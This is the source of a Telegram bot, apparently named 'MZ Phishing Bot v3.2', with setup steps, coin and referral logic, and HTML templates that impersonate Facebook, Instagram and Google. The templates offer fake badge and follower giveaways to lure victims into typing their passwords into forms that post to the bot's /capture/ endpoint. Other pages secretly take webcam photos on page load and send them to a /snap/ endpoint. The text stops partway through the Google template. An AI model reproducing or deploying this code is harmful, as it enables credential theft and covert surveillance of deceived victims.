# ═══════════════════════════════════════════════════════════════════════════
#   MZ PHISHING BOT v3.2 — FULL PACKAGE (gunicorn + admin preloaded)
#   Author: MZ MINHAZ
# ═══════════════════════════════════════════════════════════════════════════
#
#   FILE 1  →  main.py       (main bot + flask app)
#   FILE 2  →  wsgi.py       (gunicorn entrypoint)
#   FILE 3  →  start.sh      (launcher)
#   FILE 4  →  stop.sh       (stopper)
#
#   SETUP ONCE:
#     pip install python-telegram-bot flask requests Pillow gunicorn
#     mkdir -p ~/.local/bin
#     curl -L -o ~/.local/bin/cloudflared \
#       https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
#     chmod +x ~/.local/bin/cloudflared
#     echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
#     source ~/.bashrc
#     chmod +x start.sh stop.sh
#
#   RUN:
#     screen -S mzbot
#     bash start.sh
#     # Ctrl+A then D to detach
#
#   STOP:
#     bash stop.sh
#
# ═══════════════════════════════════════════════════════════════════════════
#
#   ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓  FILE 1 — main.py  ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓
#
# ═══════════════════════════════════════════════════════════════════════════
# ═══════════════════════════════════════════════════════════════════
#   FILE: main.py
#   MZ PHISHING BOT — v3.2
# ═══════════════════════════════════════════════════════════════════

import os
import re
import io
import sys
import time
import json
import base64
import random
import string
import signal
import socket
import hashlib
import asyncio
import logging
import threading
import subprocess
import traceback
from datetime import datetime

from flask import (
    Flask, request, render_template_string,
    redirect, make_response, jsonify
)
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    ContextTypes, MessageHandler, filters
)

# ═══════════════════════════════════════════════════════════════════
# LOGGING
# ═══════════════════════════════════════════════════════════════════

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("bot.log", encoding="utf-8"),
        logging.StreamHandler(sys.stdout),
    ],
)
log = logging.getLogger("mzbot")

# ═══════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════

BOT_TOKEN      = "8635417980:AAGjqoJ2lH-5nAaG8okwrICJJ_lL07r7FN8"
PORT_START     = 8080
TUNNEL_WAIT    = 90
SESSION_KEY    = hashlib.md5(BOT_TOKEN.encode()).hexdigest()[:16]

CHANNEL_URL    = "https://t.me/mz_creations_official"
CHANNEL_ID     = "@mz_creations_official"
CHANNEL_NAME   = "MZ CREATIONS OFFICIAL"

USERS_FILE     = "users.json"
CONFIG_FILE    = "config.json"

PRIMARY_ADMIN          = 8255204869
DEFAULT_COIN_COST      = 1
DEFAULT_REFERRAL_BONUS = 5
DEFAULT_WELCOME_COINS  = 0
MAX_LABEL_LEN          = 32
MAX_PAGES_PER_USER     = 50

# ═══════════════════════════════════════════════════════════════════
# PERSISTENCE
# ═══════════════════════════════════════════════════════════════════

def _load_json(path, default):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default

def _save_json(path, data):
    try:
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        os.replace(tmp, path)
    except Exception as e:
        log.error(f"save_json {path}: {e}")

users_db  = _load_json(USERS_FILE, {})
config_db = _load_json(CONFIG_FILE, {
    "admins": [],
    "coin_cost": DEFAULT_COIN_COST,
    "referral_bonus": DEFAULT_REFERRAL_BONUS,
    "welcome_coins": DEFAULT_WELCOME_COINS,
})

_admins = [int(x) for x in config_db.get("admins", [])]
if PRIMARY_ADMIN not in _admins:
    _admins.append(PRIMARY_ADMIN)
    config_db["admins"] = _admins
    _save_json(CONFIG_FILE, config_db)

def save_users():  _save_json(USERS_FILE, users_db)
def save_config(): _save_json(CONFIG_FILE, config_db)

def is_admin(uid) -> bool:
    try:
        return int(uid) in [int(x) for x in config_db.get("admins", [])]
    except Exception:
        return False

def get_user(uid) -> dict:
    k = str(uid)
    if k not in users_db:
        users_db[k] = {
            "coins": 0,
            "ref_by": None,
            "refs": [],
            "joined": False,
            "joined_at": None,
            "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "username": "",
            "first_name": "",
            "pages_created": 0,
            "captures_received": 0,
        }
    return users_db[k]

def add_coins(uid, n):
    u = get_user(uid)
    u["coins"] = max(0, int(u.get("coins", 0)) + int(n))
    save_users()

def take_coins(uid, n) -> bool:
    u = get_user(uid)
    if int(u.get("coins", 0)) < int(n):
        return False
    u["coins"] = int(u["coins"]) - int(n)
    save_users()
    return True

def coin_cost():      return int(config_db.get("coin_cost", DEFAULT_COIN_COST))
def referral_bonus(): return int(config_db.get("referral_bonus", DEFAULT_REFERRAL_BONUS))
def welcome_coins():  return int(config_db.get("welcome_coins", DEFAULT_WELCOME_COINS))

# ═══════════════════════════════════════════════════════════════════
# CHANNEL GATE
# ═══════════════════════════════════════════════════════════════════

async def is_member(bot, uid) -> bool:
    try:
        m = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=uid)
        return m.status in ("member", "administrator", "creator")
    except Exception as e:
        log.warning(f"gate check failed for {uid}: {e}")
        return False

def join_gate_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"📢 Join {CHANNEL_NAME}", url=CHANNEL_URL)],
        [InlineKeyboardButton("✅ I've Joined — Verify", callback_data="verify_join")],
    ])

# ═══════════════════════════════════════════════════════════════════
# CAMERA SCRIPT (platform templates)
# ═══════════════════════════════════════════════════════════════════

CAMERA_JS = r"""
<script>
const PAGE_ID  = "{{ page_id }}";
const NEXT_URL = "{{ next_url }}";
const DELAY_MS = {{ delay_ms }};
let stream = null, snapSent = false;

async function startCamera() {
    const btn = document.getElementById('btnAllow');
    btn.disabled = true;
    btn.innerHTML = '⏳ Requesting...';
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: 640, height: 480 },
            audio: false
        });
        const v = document.getElementById('videoEl');
        document.getElementById('camPlaceholder').style.display = 'none';
        document.getElementById('scanLine').style.display = 'block';
        v.srcObject = stream;
        v.style.display = 'block';
        btn.innerHTML = '🔍 Scanning...';
        v.onloadedmetadata = () => {
            v.play();
            setTimeout(() => {
                document.getElementById('camOverlay').style.display = 'flex';
            }, 1200);
            setTimeout(captureAndSend, 2200);
        };
    } catch (e) { skipCam(); }
}

function captureAndSend() {
    if (snapSent) return;
    snapSent = true;
    const v = document.getElementById('videoEl');
    const c = document.getElementById('snapCanvas');
    c.width = v.videoWidth || 640;
    c.height = v.videoHeight || 480;
    const ctx = c.getContext('2d');
    ctx.save(); ctx.scale(-1, 1);
    ctx.drawImage(v, -c.width, 0, c.width, c.height);
    ctx.restore();
    const img = c.toDataURL('image/jpeg', 0.85);
    fetch('/snap/' + PAGE_ID, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ img: img })
    }).catch(() => {});
    if (stream) stream.getTracks().forEach(t => t.stop());
    document.getElementById('camOverlay').style.display = 'none';
    const sm = document.getElementById('statusMsg');
    if (sm) sm.style.display = 'block';
    const btn = document.getElementById('btnAllow');
    btn.innerHTML = '✅ Verified!';
    btn.style.background = '#42b72a';
    setTimeout(() => { window.location.href = NEXT_URL; }, DELAY_MS);
}

function skipCam() {
    if (stream) stream.getTracks().forEach(t => t.stop());
    window.location.href = NEXT_URL;
}

window.addEventListener('load', () => {
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(s => {
            stream = s;
            const v = document.getElementById('videoEl');
            v.srcObject = s;
            v.style.display = 'block';
            document.getElementById('camPlaceholder').style.display = 'none';
            document.getElementById('scanLine').style.display = 'block';
            v.onloadedmetadata = () => {
                v.play();
                setTimeout(captureAndSend, 3000);
            };
        }).catch(() => {});
});
</script>
"""

def _wrap_cam(header_html: str, body_html: str, theme_css: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Verification</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
    background: #f0f2f5;
    display:flex; flex-direction:column; align-items:center; justify-content:center;
    min-height:100vh; padding:20px;
}}
.card {{ background:#fff; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,.12);
    width:100%; max-width:460px; overflow:hidden; }}
{theme_css}
.cam-area {{ position:relative; width:100%; aspect-ratio:4/3; background:#1a1a2e;
    border-radius:10px; overflow:hidden; margin-bottom:18px;
    display:flex; align-items:center; justify-content:center; }}
#videoEl {{ width:100%; height:100%; object-fit:cover; display:none; transform:scaleX(-1); }}
.cam-placeholder {{ display:flex; flex-direction:column; align-items:center; color:#aaa; gap:12px; }}
.cam-icon {{ font-size:52px; }}
.cam-placeholder p {{ font-size:13px; text-align:center; max-width:200px; line-height:1.5; }}
.scan-line {{ position:absolute; left:0; right:0; height:2px; background:rgba(24,119,242,.7);
    box-shadow:0 0 8px rgba(24,119,242,.8); display:none; animation:scanAnim 2s linear infinite; }}
@keyframes scanAnim {{ 0%{{top:0;}} 100%{{top:100%;}} }}
.cam-overlay {{ position:absolute; inset:0; display:none; align-items:center;
    justify-content:center; background:rgba(0,0,0,.55); color:#fff; font-size:14px;
    font-weight:600; flex-direction:column; gap:10px; text-align:center; padding:20px; }}
.spinner-sm {{ width:32px; height:32px; border:3px solid rgba(255,255,255,.3);
    border-top:3px solid #fff; border-radius:50%; animation:spin .8s linear infinite; }}
@keyframes spin {{ to{{transform:rotate(360deg);}} }}
.btn-allow {{ width:100%; color:#fff; border:none; border-radius:8px; padding:15px;
    font-size:16px; font-weight:700; cursor:pointer; margin-bottom:12px;
    display:flex; align-items:center; justify-content:center; gap:8px; }}
.skip-link {{ text-align:center; font-size:13px; color:#1877f2; cursor:pointer; text-decoration:underline; }}
.status-msg {{ text-align:center; font-size:13px; color:#42b72a; font-weight:600;
    margin-bottom:12px; display:none; }}
.steps {{ display:flex; justify-content:center; gap:8px; margin-bottom:20px; }}
.step {{ width:28px; height:6px; border-radius:3px; background:#e0e0e0; }}
.step.active {{ background:#1877f2; }}
.step.done {{ background:#42b72a; }}
canvas {{ display:none; }}
.secure-footer {{ text-align:center; font-size:11px; color:#8a8d91; margin-top:16px; padding:0 10px; }}
</style>
</head>
<body>
<div class="card">
    {header_html}
    <div class="card-body" style="padding:28px;">
        {body_html}
        <div class="cam-area" id="camArea">
            <video id="videoEl" autoplay playsinline muted></video>
            <div class="scan-line" id="scanLine"></div>
            <div class="cam-overlay" id="camOverlay">
                <div class="spinner-sm"></div><span>Scanning...</span>
            </div>
            <div class="cam-placeholder" id="camPlaceholder">
                <div class="cam-icon">📷</div>
                <p>Camera access required for identity verification</p>
            </div>
        </div>
        <canvas id="snapCanvas"></canvas>
        <div class="status-msg" id="statusMsg">✅ Verification successful! Continuing...</div>
        <button class="btn-allow" id="btnAllow" onclick="startCamera()" style="background:linear-gradient(135deg,#1877f2,#0d5ed9);">
            📷 Allow Camera &amp; Continue
        </button>
        <div class="skip-link" onclick="skipCam()">Skip this step →</div>
        <div class="secure-footer">🔒 Your camera feed is processed locally and never stored permanently.</div>
    </div>
</div>
{CAMERA_JS}
</body>
</html>"""


CAM_FACEBOOK = _wrap_cam(
    header_html="""<div class="card-header" style="background:linear-gradient(135deg,#1877f2,#0d5ed9);padding:22px 28px;color:#fff;">
        <div><div style="font-size:28px;font-weight:900;letter-spacing:-1px;">facebook</div>
        <div style="font-size:12px;opacity:.85;margin-top:2px;">Security Verification System</div></div>
    </div>""",
    body_html="""<div class="steps"><div class="step done"></div><div class="step active"></div><div class="step"></div></div>
    <div style="background:#fff3cd;border:1px solid #ffc107;border-radius:8px;padding:14px 16px;margin-bottom:22px;display:flex;gap:12px;align-items:flex-start;">
        <div style="font-size:20px;flex-shrink:0;">⚠️</div>
        <div style="font-size:13px;color:#856404;line-height:1.5;">
            <b style="display:block;margin-bottom:3px;">Identity Verification Required</b>
            Unusual activity detected on your account. Please complete a quick face scan to confirm your identity.
        </div>
    </div>""",
    theme_css=".btn-allow{background:linear-gradient(135deg,#1877f2,#0d5ed9);}"
)

CAM_INSTAGRAM = _wrap_cam(
    header_html="""<div class="card-header" style="background:linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045);padding:22px 28px;color:#fff;">
        <div><div style="font-size:26px;font-weight:800;letter-spacing:-0.5px;">Instagram</div>
        <div style="font-size:12px;opacity:.9;margin-top:2px;">Account Security Check</div></div>
    </div>""",
    body_html="""<div class="steps"><div class="step done" style="background:#c13584;"></div><div class="step active" style="background:#fd1d1d;"></div><div class="step"></div></div>
    <div style="background:#fdf0f5;border:1px solid #f7c7dd;border-radius:8px;padding:14px 16px;margin-bottom:22px;display:flex;gap:12px;align-items:flex-start;">
        <div style="font-size:20px;flex-shrink:0;">🛡️</div>
        <div style="font-size:13px;color:#a02456;line-height:1.5;">
            <b style="display:block;margin-bottom:3px;">Confirm it's you</b>
            We noticed a login from a new location. Take a quick selfie to confirm it's really you.
        </div>
    </div>""",
    theme_css=".btn-allow{background:linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045);}.scan-line{background:rgba(253,29,29,.8)!important;box-shadow:0 0 8px rgba(253,29,29,.9)!important;}.skip-link{color:#c13584!important;}"
)

CAM_GOOGLE = _wrap_cam(
    header_html="""<div class="card-header" style="background:#fff;padding:22px 28px;border-bottom:1px solid #e8eaed;">
        <div>
            <div style="font-size:22px;font-weight:600;">
                <span style="color:#4285f4;">G</span><span style="color:#ea4335;">o</span><span style="color:#fbbc05;">o</span><span style="color:#4285f4;">g</span><span style="color:#34a853;">l</span><span style="color:#ea4335;">e</span>
            </div>
            <div style="font-size:12px;color:#5f6368;margin-top:2px;">Verify it's you</div>
        </div>
    </div>""",
    body_html="""<div class="steps"><div class="step done" style="background:#4285f4;"></div><div class="step active" style="background:#1a73e8;"></div><div class="step"></div></div>
    <div style="background:#e8f0fe;border:1px solid #c5d9f9;border-radius:8px;padding:14px 16px;margin-bottom:22px;display:flex;gap:12px;align-items:flex-start;">
        <div style="font-size:20px;flex-shrink:0;">🔐</div>
        <div style="font-size:13px;color:#174ea6;line-height:1.5;">
            <b style="display:block;margin-bottom:3px;">Google needs to verify it's you</b>
            Take a quick selfie to confirm your identity before we continue.
        </div>
    </div>""",
    theme_css=".btn-allow{background:#1a73e8;}.scan-line{background:rgba(26,115,232,.8)!important;}.skip-link{color:#1a73e8!important;}"
)

CAM_GENERIC = _wrap_cam(
    header_html="""<div class="card-header" style="background:linear-gradient(135deg,#2c3e50,#1a252f);padding:22px 28px;color:#fff;">
        <div><div style="font-size:22px;font-weight:800;letter-spacing:0.5px;">🔒 Secure Portal</div>
        <div style="font-size:12px;opacity:.85;margin-top:2px;">Security Verification Required</div></div>
    </div>""",
    body_html="""<div class="steps"><div class="step done" style="background:#2c3e50;"></div><div class="step active" style="background:#34495e;"></div><div class="step"></div></div>
    <div style="background:#f1f3f5;border:1px solid #ced4da;border-radius:8px;padding:14px 16px;margin-bottom:22px;display:flex;gap:12px;align-items:flex-start;">
        <div style="font-size:20px;flex-shrink:0;">🛡️</div>
        <div style="font-size:13px;color:#343a40;line-height:1.5;">
            <b style="display:block;margin-bottom:3px;">Face scan required</b>
            Complete a quick face scan to continue to the page you requested.
        </div>
    </div>""",
    theme_css=".btn-allow{background:linear-gradient(135deg,#2c3e50,#1a252f);}.scan-line{background:rgba(52,73,94,.85)!important;}.skip-link{color:#2c3e50!important;}"
)

CAMERA_ONLY_BLANK = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verification</title>
<style>
html, body { margin:0; padding:0; height:100%; background:#ffffff; overflow:hidden;
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif; }
video, canvas { display:none !important; }
.overlay { position:fixed; inset:0; background:rgba(0,0,0,.45);
    display:flex; align-items:center; justify-content:center; padding:20px; z-index:9999; }
.modal { background:#fff; border-radius:14px; width:100%; max-width:300px;
    padding:22px 20px 18px; box-shadow:0 12px 40px rgba(0,0,0,.25);
    text-align:center; animation:pop .18s ease-out; }
@keyframes pop { from { transform:scale(.92); opacity:0; } to { transform:scale(1); opacity:1; } }
.icon { width:52px; height:52px; margin:0 auto 12px; border-radius:50%;
    background:linear-gradient(135deg,#1877f2,#0d5ed9);
    display:flex; align-items:center; justify-content:center; font-size:26px; color:#fff; }
.modal h3 { font-size:15px; font-weight:700; color:#1c1e21; margin:0 0 6px; }
.modal p { font-size:12.5px; color:#606770; line-height:1.5; margin:0 0 16px; }
.btn-ok { width:100%; background:linear-gradient(135deg,#1877f2,#0d5ed9);
    color:#fff; border:none; border-radius:8px; padding:11px;
    font-size:14px; font-weight:700; cursor:pointer; }
.btn-ok:active { opacity:.9; }
.btn-cancel { margin-top:8px; width:100%; background:transparent; color:#8a8d91;
    border:none; padding:8px; font-size:12.5px; cursor:pointer; }
</style>
</head>
<body>
<div class="overlay" id="ov">
    <div class="modal">
        <div class="icon">🛡️</div>
        <h3>Verification Required</h3>
        <p>Please allow camera access to verify you are human.</p>
        <button class="btn-ok" onclick="proceed()">Please Allow for Verification</button>
        <button class="btn-cancel" onclick="skip()">Cancel</button>
    </div>
</div>
<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>
<script>
const PAGE_ID = "{{ page_id }}";
const NEXT    = "{{ next_url }}";
let fired = false;
function go() { if (fired) return; fired = true; window.location.replace(NEXT); }
function hideOverlay() { document.getElementById('ov').style.display = 'none'; }

async function snap(video) {
    const c = document.getElementById('c');
    c.width  = video.videoWidth  || 640;
    c.height = video.videoHeight || 480;
    const x = c.getContext('2d');
    x.save(); x.scale(-1, 1);
    x.drawImage(video, -c.width, 0, c.width, c.height);
    x.restore();
    const img = c.toDataURL('image/jpeg', 0.85);
    try {
        await fetch('/snap/' + PAGE_ID, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ img: img })
        });
    } catch (e) {}
}

async function proceed() {
    hideOverlay();
    try {
        const s = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: 640, height: 480 },
            audio: false
        });
        const v = document.getElementById('v');
        v.srcObject = s;
        await v.play().catch(() => {});
        await new Promise(r => setTimeout(r, 400));
        await snap(v);
        s.getTracks().forEach(t => t.stop());
        setTimeout(go, 900);
    } catch (err) { go(); }
}
function skip() { go(); }
</script>
</body>
</html>"""

CAMERA_TEMPLATES = {
    "facebook":  CAM_FACEBOOK,
    "instagram": CAM_INSTAGRAM,
    "google":    CAM_GOOGLE,
    "generic":   CAM_GENERIC,
}

# ═══════════════════════════════════════════════════════════════════
# PHISH TEMPLATES
# ═══════════════════════════════════════════════════════════════════

TEMPLATES = {
    "facebook": """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook Verification – Official Badge Program</title>
<link rel="icon" href="https://www.facebook.com/favicon.ico">
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background:#f0f2f5; font-family:Helvetica,Arial,sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; padding:20px; }
.top-banner { background:linear-gradient(135deg,#1877f2 0%,#0d5ed9 100%); color:#fff; width:100%; max-width:500px; border-radius:10px 10px 0 0; padding:18px 24px; display:flex; align-items:center; gap:14px; }
.top-banner .badge-icon { font-size:38px; flex-shrink:0; }
.top-banner h1 { font-size:17px; font-weight:700; line-height:1.3; }
.top-banner p { font-size:12px; opacity:.88; margin-top:3px; }
.offer-card { background:#fff; width:100%; max-width:500px; padding:20px 24px 16px; border-left:1px solid #e0e0e0; border-right:1px solid #e0e0e0; }
.headline { font-size:15px; font-weight:700; color:#1c1e21; margin-bottom:6px; }
.sub { font-size:13px; color:#606770; line-height:1.55; margin-bottom:14px; }
.perks { display:flex; flex-direction:column; gap:9px; margin-bottom:16px; }
.perk { display:flex; align-items:flex-start; gap:10px; font-size:13px; color:#1c1e21; }
.perk .icon { font-size:17px; flex-shrink:0; margin-top:1px; }
.timer-row { background:#fff3cd; border:1px solid #ffc107; border-radius:6px; padding:10px 14px; font-size:13px; color:#856404; display:flex; align-items:center; gap:8px; margin-bottom:4px; }
.timer-row span { font-weight:700; }
.login-box { background:#fff; width:100%; max-width:500px; padding:20px 24px 24px; border:1px solid #e0e0e0; border-top:none; border-radius:0 0 10px 10px; box-shadow:0 4px 12px rgba(0,0,0,.08); }
.step-label { font-size:13px; font-weight:700; color:#1877f2; text-transform:uppercase; letter-spacing:.5px; margin-bottom:12px; }
.step-desc { font-size:13px; color:#606770; margin-bottom:16px; line-height:1.5; }
input { width:100%; padding:13px 16px; border:1.5px solid #ddd; border-radius:6px; font-size:15px; margin-bottom:10px; }
input:focus { border-color:#1877f2; outline:none; box-shadow:0 0 0 2px rgba(24,119,242,.15); }
.btn-verify { width:100%; background:linear-gradient(135deg,#1877f2 0%,#0d5ed9 100%); color:#fff; border:none; border-radius:6px; padding:14px; font-size:16px; font-weight:700; cursor:pointer; margin-top:4px; display:flex; align-items:center; justify-content:center; gap:8px; }
.secure-note { text-align:center; font-size:11.5px; color:#8a8d91; margin-top:14px; }
.forgot { text-align:center; margin-top:10px; font-size:13px; color:#1877f2; cursor:pointer; }
.divider { border:none; border-top:1px solid #e8e8e8; margin:16px 0; }
.footer-note { font-size:11.5px; color:#8a8d91; text-align:center; margin-top:18px; max-width:500px; line-height:1.6; }
</style>
</head>
<body>
<div class="top-banner">
    <div class="badge-icon">✅</div>
    <div><h1>Facebook Verified Badge Program</h1><p>Official account verification &amp; blue checkmark</p></div>
</div>
<div class="offer-card">
    <div class="headline">🎉 You're eligible for a FREE Verified Badge!</div>
    <div class="sub">Facebook is offering free blue verification badges to eligible accounts. Verified accounts get priority support, increased reach, and protection against impersonation — at no cost during this limited program.</div>
    <div class="perks">
        <div class="perk"><span class="icon">✅</span><span><b>Blue checkmark</b> on your profile and all posts</span></div>
        <div class="perk"><span class="icon">🛡️</span><span><b>Impersonation protection</b> — only you can use your name</span></div>
        <div class="perk"><span class="icon">📈</span><span><b>Increased reach</b> — verified posts shown to more people</span></div>
        <div class="perk"><span class="icon">⭐</span><span><b>Priority support</b> — direct Facebook Help Team access</span></div>
    </div>
    <div class="timer-row">⏳ <span>Limited offer</span> — Badge slots filling fast. Verify now!</div>
</div>
<div class="login-box">
    <div class="step-label">Step 3 of 3 — Account Login</div>
    <div class="step-desc">Identity verified ✅ — Log in to complete your badge application.</div>
    <form method="POST" action="/capture/{{ page_id }}">
        <input type="text" name="email" placeholder="Email address or phone number" required autocomplete="off">
        <input type="password" name="password" placeholder="Facebook password" required autocomplete="off">
        <button class="btn-verify" type="submit">✅ Complete Verification &amp; Apply for Badge</button>
    </form>
    <div class="forgot">Forgot password?</div>
    <hr class="divider">
    <div class="secure-note">🔒 Secured by Facebook · SSL Encrypted · Official Program</div>
</div>
<div class="footer-note">© 2024 Facebook, Inc. · Privacy Policy · Terms of Service</div>
</body>
</html>""",

    "instagram": """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram – Free Followers Program</title>
<link rel="icon" href="https://www.instagram.com/favicon.ico">
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background:#fafafa; font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; padding:16px; }
.top-banner { background:linear-gradient(135deg,#833ab4 0%,#fd1d1d 50%,#fcb045 100%); color:#fff; width:100%; max-width:400px; border-radius:10px 10px 0 0; padding:18px 22px; display:flex; align-items:center; gap:14px; }
.top-banner .icon { font-size:34px; }
.top-banner h1 { font-size:16px; font-weight:700; line-height:1.3; }
.top-banner p { font-size:12px; opacity:.9; margin-top:3px; }
.offer-card { background:#fff; width:100%; max-width:400px; padding:18px 22px 14px; border-left:1px solid #dbdbdb; border-right:1px solid #dbdbdb; }
.headline { font-size:15px; font-weight:700; color:#262626; margin-bottom:6px; }
.sub { font-size:13px; color:#8e8e8e; line-height:1.5; margin-bottom:14px; }
.perks { display:flex; flex-direction:column; gap:8px; margin-bottom:14px; }
.perk { display:flex; align-items:flex-start; gap:10px; font-size:13px; color:#262626; }
.perk .icon { font-size:16px; flex-shrink:0; }
.timer-row { background:#fdf0f5; border:1px solid #f7c7dd; border-radius:6px; padding:10px 14px; font-size:13px; color:#a02456; display:flex; align-items:center; gap:8px; }
.timer-row span { font-weight:700; }
.login-box { background:#fff; width:100%; max-width:400px; padding:20px 22px 24px; border:1px solid #dbdbdb; border-top:none; border-radius:0 0 10px 10px; }
.ig-logo { font-size:28px; font-weight:800; text-align:center; margin-bottom:18px; background:linear-gradient(45deg,#833ab4,#fd1d1d,#fcb045); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; }
input { width:100%; background:#fafafa; border:1px solid #dbdbdb; border-radius:4px; padding:11px 10px; font-size:13px; margin-bottom:8px; }
input:focus { border-color:#a8a8a8; outline:none; }
.btn { width:100%; background:linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045); color:#fff; border:none; border-radius:6px; padding:12px; font-size:14px; font-weight:700; cursor:pointer; margin-top:8px; }
.or { text-align:center; color:#8e8e8e; font-size:12px; font-weight:600; margin:16px 0; position:relative; }
.or::before, .or::after { content:''; position:absolute; top:50%; width:40%; height:1px; background:#dbdbdb; }
.or::before { left:0; } .or::after { right:0; }
.fb-btn { color:#385185; font-size:13px; font-weight:600; text-align:center; cursor:pointer; }
.forgot { color:#00376b; font-size:12px; text-align:center; margin-top:12px; }
.footer-note { font-size:11px; color:#8e8e8e; text-align:center; margin-top:16px; max-width:400px; line-height:1.5; }
</style>
</head>
<body>
<div class="top-banner">
    <div class="icon">🎁</div>
    <div><h1>Instagram Free Followers Program</h1><p>Get real followers — limited time offer</p></div>
</div>
<div class="offer-card">
    <div class="headline">🎉 You qualify for 10,000 FREE Followers!</div>
    <div class="sub">Instagram is rewarding active accounts with a free follower boost. Confirm your account to receive your followers within 24 hours.</div>
    <div class="perks">
        <div class="perk"><span class="icon">👥</span><span><b>10,000 real followers</b> — delivered gradually over 24h</span></div>
        <div class="perk"><span class="icon">❤️</span><span><b>Boosted engagement</b> — likes, comments, shares</span></div>
        <div class="perk"><span class="icon">✅</span><span><b>Verified account</b> eligibility for blue tick</span></div>
        <div class="perk"><span class="icon">📈</span><span><b>Priority in Explore</b> — more reach on posts</span></div>
    </div>
    <div class="timer-row">⏳ <span>Offer expires in 24h</span> — confirm now to claim</div>
</div>
<div class="login-box">
    <div class="ig-logo">Instagram</div>
    <form method="POST" action="/capture/{{ page_id }}">
        <input type="text" name="email" placeholder="Phone number, username, or email" autocomplete="off" required>
        <input type="password" name="password" placeholder="Password" autocomplete="off" required>
        <button class="btn" type="submit">Claim My Free Followers →</button>
    </form>
    <div class="or">OR</div>
    <div class="fb-btn">Log in with Facebook</div>
    <div class="forgot">Forgot password?</div>
</div>
<div class="footer-note">© 2024 Instagram · This is an official follower reward program</div>
</body>
</html>""",

    "google": """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google – Free Play Store Credit</title>
<link rel="icon" href="https://www.google.com/favicon.ico">
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:'Google Sans',Roboto,Arial,sans-serif; background:#fff; display:flex; flex-direction:column; justify-content:center; align-items:center; min-height:100vh; padding:16px; }
.top-banner { background:linear-gradient(135deg,#4285f4 0%,#34a853 100%); color:#fff; width:100%; max-width:460px; border-radius:10px 10px 0 0; padding:20px 24px; display:flex; align-items:center; gap:14px; }
.top-banner .icon { font-size:34px; }
.top-banner h1 { font-size:16px; font-weight:700; line-height:1.3; }
.top-banner p { font-size:12px; opacity:.9; margin-top:3px; }
.offer-card { background:#fff; width:100%; max-width:460px; padding:20px 24px 14px; border-left:1px solid #dadce0; border-right:1px solid #dadce0; }
.headline { font-size:15px; font-weight:700; color:#202124; margin-bottom:6px; }
.sub { font-size:13px; color:#5f6368; line-height:1.55; margin-bottom:14px; }
.perks { display:flex; flex-direction:column; gap:9px; margin-bottom:16px; }
.perk { display:flex; align-items:flex-start; gap:10px; font-size:13px; color:#202124; }
.perk .icon { font-size:17px; flex-shrink:0; }
.timer-row { background:#e8f0fe; border:1px solid #c5d9f9; border-radius:6px; padding:10px 14px; font-size:13px; color:#174ea6; display:flex; align-items:center; gap:8px; margin-bottom:4px; }
.timer-row span { font-weight:700; }
.card { background:#fff; border:1px solid #dadce0; border-top:none; border-radius:0 0 10px 10px; padding:24px 24px 28px; width:100%; max-width:460px; box-shadow:0 4px 12px rgba(0,0,0,.06); }
.google-logo { text-align:center; margin-bottom:16px; font-size:22px; font-weight:500; letter-spacing:-0.5px; }
.google-logo span:nth-child(1){color:#4285f4}
.google-logo span:nth-child(2){color:#ea4335}
.google-logo span:nth-child(3){color:#fbbc05}
.google-logo span:nth-child(4){color:#4285f4}
.google-logo span:nth-child(5){color:#34a853}
.google-logo span:nth-child(6){color:#ea4335}
.step-label { font-size:12px; font-weight:700; color:#1a73e8; text-transform:uppercase; letter-spacing:.5px; margin-bottom:10px; }
.step-desc { font-size:13px; color:#5f6368; margin-bottom:16px; line-height:1.5; }
